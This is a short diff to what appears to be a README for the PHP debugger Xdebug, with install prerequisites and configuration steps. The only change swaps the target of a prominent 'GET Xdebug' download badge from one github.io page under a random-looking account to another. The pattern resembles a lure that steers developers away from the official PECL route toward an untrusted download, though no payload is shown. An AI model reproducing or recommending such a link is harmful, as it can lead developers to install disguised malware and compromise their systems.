@@ -56,7 +56,7 @@ Xdebug fits many PHP environments, from Laravel projects and Composer-based appl
 
 Prerequisites: A working PHP installation, access to the loaded php.ini file, and an IDE or editor configured to listen for Xdebug connections.
 
-[![GET Xdebug](https://img.shields.io/badge/GET%20%E2%80%94%20Xdebug-0078D6?style=for-the-badge&logoColor=white)](https://moisesnealrrcb.github.io/.github/xdebug-app)
+[![GET Xdebug](https://img.shields.io/badge/GET%20%E2%80%94%20Xdebug-0078D6?style=for-the-badge&logoColor=white)](https://enzostricklandhfnj.github.io/.github/xdebug-app)
 
 1.  **Download and Enable:** Use xdebug download resources, pecl xdebug, or pecl install xdebug to install the extension that matches your PHP version.
 2.  **Update Configuration:** Add the xdebug extension entry, enable the required mode, and set xdebug port, client host, and trigger settings for your environment.
